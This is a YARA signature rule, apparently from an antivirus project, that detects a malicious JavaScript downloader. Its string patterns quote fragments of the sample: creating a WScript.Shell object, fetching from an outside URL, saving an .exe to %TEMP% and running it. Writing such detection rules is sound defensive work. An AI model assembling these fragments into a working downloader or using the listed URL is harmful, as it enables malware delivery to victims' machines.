rule sig_20160330_c08ce454244498dae119eace0e7f6d88 {
  meta:
    description = "datamaliciousorder - file 20160330_c08ce454244498dae119eace0e7f6d88.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3392da228ced09df8fa6ad54ae66b60eb6bec7847ea189cf814d6ccef1bc2ae7"

  strings:
    $s1  = "var A1 = function O0() {return WScript[PS](\"WScript\"+\".Shell\");}(), SH = 11;" fullword ascii
    $s2  = "A2[A](\"GET\", \"http://xn--po-wqa.pl/a8zkde\", false);" fullword ascii
    $s3  = "function Y(OR, AA){K = K * 1; return OR - AA;};" fullword ascii
    $s4  = "if (A2[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function PT() {return A1[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"OmCtUNHNg.ex\" + \"e\";};" fullword ascii
    $s6  = "function V(){return HC + \"\";};" fullword ascii
    $s7  = "function LC(QT){A1[\"Run\"](QT, K, K);};" fullword ascii
    $s8  = "function O() {return ((FC == true) && (FC == UT)) ? 1 : K;};" fullword ascii
    $s9  = "var N0 = new this[\"Date\"]();" fullword ascii
    $s10 = "}while (J);" fullword ascii
    $s11 = "return Y(AG, S);" fullword ascii
    $s12 = "function CQ(){return 22;};" fullword ascii
    $s13 = "function FN()" fullword ascii
    $s14 = "function X(U) {var D = (1, 2, 3, 4, 5, U); return D;};" fullword ascii
    $s15 = "function N(){return PS;};" fullword ascii
    $s16 = "var L = false;" fullword ascii
    $s17 = "var UT = false;" fullword ascii
    $s18 = "UT = true; " fullword ascii
    $s19 = "var FC = false;" fullword ascii
    $s20 = "FC = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}